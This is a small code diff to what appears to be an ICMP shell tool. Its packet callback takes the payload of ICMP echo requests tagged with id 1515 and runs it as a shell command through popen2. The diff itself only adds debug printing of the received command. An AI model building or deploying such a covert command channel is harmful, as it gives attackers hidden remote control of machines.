@@ -70,7 +70,11 @@ def edaemon():
 
 def packet_callback(packet):
     if ICMP in packet and packet[ICMP].type == 8 and packet[ICMP].id == 1515:
-        child_conn, process = ish_open.popen2(packet[ICMP].payload.load.decode('utf-8'))
+        received_data = packet[ICMP].payload.load.decode('utf-8')
+        print("-----+ IN DATA +------")
+        print(received_data)
+        print("-----+ OUT DATA +-----")
+        child_conn, process = ish_open.popen2(received_data)
         ishell.sendhdr.cntrl = 0
 
         process.stdin.close()
